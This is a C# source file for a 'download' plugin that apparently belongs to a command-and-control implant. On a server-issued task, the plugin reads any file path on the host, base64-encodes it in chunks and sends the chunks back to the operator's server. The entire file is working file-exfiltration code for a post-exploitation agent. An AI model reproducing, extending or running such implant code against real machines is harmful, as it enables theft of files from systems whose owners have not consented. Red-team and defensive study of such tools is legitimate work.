using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using System;
using System.Collections.Concurrent;
using System.Text.Json;
using System.Security.Principal;
using System.Globalization;
using System.Security.Cryptography;

namespace Agent
{
    public class DownloadJsonResponse
    {
        public int currentChunk { get; set; }
        public int totalChunks { get; set; }
        public string file_id { get; set; }

        public string ToJson()
        {
            return JsonSerializer.Serialize(this);
        }
    }
    public class Plugin : IFilePlugin
    {
        public string Name => "download";
        private IMessageManager messageManager { get; set; }
        private ILogger logger { get; set; }
        private ITokenManager tokenManager { get; set; }
        private IAgentConfig config { get; set; }
        private ConcurrentDictionary<string, ServerDownloadJob> downloadJobs { get; set; }
        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.messageManager = messageManager;
            this.logger = logger;
            this.downloadJobs = new ConcurrentDictionary<string, ServerDownloadJob>();
            this.tokenManager = tokenManager;
            this.config = config;
        }

        public async Task Execute(ServerJob job)
        {
            DownloadArgs args = JsonSerializer.Deserialize<DownloadArgs>(job.task.parameters);
            string message = string.Empty;
            if(args is null || !args.Validate(out message))
            {
                await messageManager.AddResponse(new DownloadResponse
                {
                    status = "error",
                    process_response = new Dictionary<string, string> { { "message", message } },
                    completed = true,
                    task_id = job.task.id
                }.ToJson());
                return;
            }
            ServerDownloadJob downloadJob = new ServerDownloadJob(job, args.path, this.config.chunk_size);

            downloadJob.total_chunks = await GetTotalChunks(downloadJob);

            if(downloadJob.total_chunks == 0)
            {
                await messageManager.AddResponse(new DownloadResponse
                {
                    status = "error",
                    process_response = new Dictionary<string, string> { { "message", "Failed calculating number of messages" } },
                    completed = true,
                    task_id = job.task.id
                }.ToJson());
                this.CompleteDownloadJob(job.task.id);
                return;
            }


            //Add the job to the list of jobs
            downloadJobs.GetOrAdd(job.task.id, downloadJob);

            //Send the first response, start download process.
            await messageManager.AddResponse(new DownloadResponse
            {
                user_output = new DownloadJsonResponse()
                {
                    currentChunk = 0,
                    totalChunks = downloadJob.total_chunks,
                    file_id = string.Empty,
                }.ToJson(),
                download = new DownloadResponseData()
                {
                    total_chunks = downloadJob.total_chunks,
                    full_path = downloadJob.path,
                    chunk_num = 0,
                    chunk_data = string.Empty,
                    is_screenshot = false,
                    host = "",
                },
                status = "processed",
                task_id = job.task.id,
                completed = false,
            }.ToJson());
        }

        public async Task HandleNextMessage(ServerResponseResult response)
        {
            //Get Tracker job
            ServerDownloadJob downloadJob = this.GetJob(response.task_id);
 
            if(response.status != "success" || downloadJob.cancellationtokensource.IsCancellationRequested)
            {
                string message = "Cancelled by user.";
                if (response.status != "success")
                {
                    message = "An error occurred while communicating with the server.";
                }
                await this.messageManager.WriteLine(message, response.task_id, true, "error");
                this.CompleteDownloadJob(response.task_id);
                return;
            }

            if (string.IsNullOrEmpty(downloadJob.file_id))
            {
                downloadJob.file_id = response.file_id;
            }

            downloadJob.chunk_num++;
            bool completed = (downloadJob.chunk_num == downloadJob.total_chunks);

            //Prepare download response
            DownloadResponse dr = new DownloadResponse()
            {
                task_id = response.task_id,
                user_output = new DownloadJsonResponse()
                {
                    currentChunk = downloadJob.chunk_num,
                    totalChunks = downloadJob.total_chunks,
                    file_id = downloadJob.file_id,
                }.ToJson(),

                //user_output = downloadJob.chunk_num.ToString(),
                download = new DownloadResponseData
                {
                    is_screenshot = false,
                    host = "",
                    file_id = downloadJob.file_id,
                    full_path = downloadJob.path,
                    chunk_num = downloadJob.chunk_num,
                },
                status = completed ? String.Empty : $"Processed {downloadJob.chunk_num}/{downloadJob.total_chunks}",
                completed = (downloadJob.chunk_num == downloadJob.total_chunks),
            };

            if(this.TryHandleNextChunk(downloadJob, out var chunk))
            {
                dr.download.chunk_data = chunk;
            }
            else
            {
                dr.user_output = chunk;
                dr.status = "error";
                dr.download.chunk_data = String.Empty;
                this.CompleteDownloadJob(response.task_id);
            }

            await messageManager.AddResponse(dr.ToJson());

            if (dr.completed)
            {
                this.CompleteDownloadJob(response.task_id);
            }
        }
        /// <summary>
        /// Return the number of chunks required to download the file
        /// </summary>
        /// <param name="job">Download job that's being tracked</param>
        private async Task<int> GetTotalChunks(ServerDownloadJob job)
        {
            try
            {
                var fi = new FileInfo(job.path);
                return (int)Math.Ceiling((double)fi.Length / job.chunk_size);
            }
            catch
            {
                return 0;
            }
        }
        /// <summary>
        /// Complete and remove the download job from our tracker
        /// </summary>
        /// <param name="task_id">The task ID of the download job to complete</param>
        public void CompleteDownloadJob(string task_id)
        {
            downloadJobs.Remove(task_id, out _);
            this.messageManager.CompleteJob(task_id);
        }
        /// <summary>
        /// Read the next chunk from the file
        /// </summary>
        /// <param name="job">Download job that's being tracked</param>
        public bool TryHandleNextChunk(ServerDownloadJob job, out string chunk)
        {
            try
            {
                if (job.total_chunks == 1)
                {
                    job.complete = true;
                    chunk = Misc.Base64Encode(File.ReadAllBytes(job.path));
                    return true;
                }
                long totalBytesRead = job.chunk_size * (job.chunk_num - 1);

                using (var fileStream = new FileStream(job.path, FileMode.Open, FileAccess.Read))
                {
                    byte[] buffer = new byte[job.chunk_size];

                    FileInfo fileInfo = new FileInfo(job.path);

                    if (fileInfo.Length - totalBytesRead < job.chunk_size)
                    {
                        job.complete = true;
                        buffer = new byte[fileInfo.Length - job.bytesRead];
                    }

                    fileStream.Seek(job.bytesRead, SeekOrigin.Begin);
                    job.bytesRead += fileStream.Read(buffer, 0, buffer.Length);
                    chunk = Misc.Base64Encode(buffer);
                    return true;
                };
            }
            catch (Exception e)
            {
                job.complete = true;
                chunk = e.ToString();
                return false;
            }
        }
        public async Task<Tuple<bool,string>> TryHandleNextChunk(ServerDownloadJob job)
        {
            try
            {
                if (job.total_chunks == 1)
                {
                    job.complete = true;
                    return new Tuple<bool, string>(true,Misc.Base64Encode(await File.ReadAllBytesAsync(job.path)));
                }
                long totalBytesRead = job.chunk_size * (job.chunk_num - 1);

                using (var fileStream = new FileStream(job.path, FileMode.Open, FileAccess.Read))
                {
                    byte[] buffer = new byte[job.chunk_size];

                    FileInfo fileInfo = new FileInfo(job.path);

                    if (fileInfo.Length - totalBytesRead < job.chunk_size)
                    {
                        job.complete = true;
                        buffer = new byte[fileInfo.Length - job.bytesRead];
                    }

                    fileStream.Seek(job.bytesRead, SeekOrigin.Begin);
                    job.bytesRead += fileStream.Read(buffer, 0, buffer.Length);
                    return new Tuple<bool, string>(true, Misc.Base64Encode(buffer));
                };
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
                job.complete = true;
                return new Tuple<bool, string>(false, e.ToString());
            }
        }
        /// <summary>
        /// Get a download job by ID
        /// </summary>
        /// <param name="task_id">ID of the download job</param>
        public ServerDownloadJob GetJob(string task_id)
        {
            return downloadJobs[task_id];
        }
    }
}
